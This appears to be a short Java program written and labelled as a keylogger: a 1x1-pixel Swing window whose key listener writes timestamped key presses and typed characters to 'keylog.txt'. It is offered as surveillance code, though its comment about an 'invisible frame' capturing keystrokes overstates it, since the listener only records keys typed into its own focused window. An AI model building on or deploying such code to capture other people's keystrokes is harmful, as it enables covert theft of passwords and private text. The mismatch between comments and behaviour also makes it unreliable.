import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.text.SimpleDateFormat;
import java.util.Date;
import javax.swing.JFrame;
import javax.swing.JTextArea;

public class main {
    private static PrintWriter writer;
    private static SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
    
    public static void main(String[] args) {
        try {
            // Create log file
            writer = new PrintWriter(new FileWriter("keylog.txt", true));
            writer.println("=== Keylogger Started: " + dateFormat.format(new Date()) + " ===");
            writer.flush();
            
            // Create invisible frame to capture keystrokes
            JFrame frame = new JFrame("Keylogger");
            frame.setSize(1, 1);
            frame.setLocationRelativeTo(null);
            frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
            
            JTextArea textArea = new JTextArea();
            textArea.addKeyListener(new KeyListener() {
                @Override
                public void keyPressed(KeyEvent e) {
                    String keyText = KeyEvent.getKeyText(e.getKeyCode());
                    String timestamp = dateFormat.format(new Date());
                    
                    // Log the keystroke
                    String logEntry = timestamp + " - Key Pressed: " + keyText + " (Code: " + e.getKeyCode() + ")";
                    writer.println(logEntry);
                    writer.flush();
                    
                    System.out.println(logEntry);
                }
                
                @Override
                public void keyReleased(KeyEvent e) {
                    // Optional: log key release events
                }
                
                @Override
                public void keyTyped(KeyEvent e) {
                    // Log the actual character typed
                    if (e.getKeyChar() != KeyEvent.CHAR_UNDEFINED) {
                        String timestamp = dateFormat.format(new Date());
                        String logEntry = timestamp + " - Character Typed: '" + e.getKeyChar() + "'";
                        writer.println(logEntry);
                        writer.flush();
                    }
                }
            });
            
            frame.add(textArea);
            frame.setVisible(true);
            textArea.requestFocus();
            
            System.out.println("Keylogger is running. Press Ctrl+C to stop.");
            System.out.println("Keystrokes are being logged to 'keylog.txt'");
            
            // Keep the program running
            while (true) {
                Thread.sleep(1000);
            }
            
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        } finally {
            if (writer != null) {
                writer.println("=== Keylogger Stopped: " + dateFormat.format(new Date()) + " ===");
                writer.close();
            }
        }
    }
}
